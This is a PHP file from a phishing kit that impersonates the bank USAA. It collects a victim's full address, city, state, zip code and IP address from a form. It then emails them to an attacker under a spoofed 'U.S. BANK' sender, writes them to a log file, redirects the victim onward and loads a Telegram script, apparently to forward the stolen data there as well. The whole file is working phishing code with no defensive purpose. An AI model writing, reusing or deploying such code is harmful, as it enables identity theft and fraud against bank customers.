<?php

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "[+]✅ USAA Address ✅[+]\n";
$message .= "Full Address : ".$_POST['add']."\n";
$message .= "City : ".$_POST['city']."\n";
$message .= "State : ".$_POST['state']."\n";
$message .= "Zip Code : ".$_POST['zip']."\n";
$message .= "Ip : $ip\n";
$message .= "[+]✅ USAA Address ✅[+]\n";
$subject = "Personal Info | $ip ";
$headers = "From:U.S. BANK <itna1337@network.pickup.fr>";
mail($send,$subject,$message,$headers);
fwrite($text, $message);

header("Location: ../mail.php?id=TjPHHItfhaYEfjLMTatqBtwTBhLvLa6UjnGedbXQ&_ga=2.165334463.1021036329.1648528336-393105297.1648295705&l=1");


include "Telegram.php";

?>